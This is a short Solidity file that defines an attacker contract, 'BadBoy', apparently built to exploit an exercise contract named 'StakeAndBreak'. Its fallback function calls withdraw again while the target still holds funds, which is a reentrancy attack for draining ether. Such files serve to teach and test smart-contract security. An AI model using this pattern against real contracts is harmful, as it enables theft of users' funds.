pragma solidity ^0.4.24;

import "./StakeAndBreak.sol";

contract BadBoy {

  StakeAndBreak stakeAndBreak;
  uint withdrawAmount;

  constructor (StakeAndBreak _stakeAndBreak, uint _withdrawAmount) public payable {
    stakeAndBreak = _stakeAndBreak;
    withdrawAmount = _withdrawAmount;
  }

  function () payable {
    if (stakeAndBreak.balance > 0) {
      stakeAndBreak.withdraw(withdrawAmount);
    }
  }
  
  function deposit () public payable {
    stakeAndBreak.deposit.value(msg.value)();
  }

}
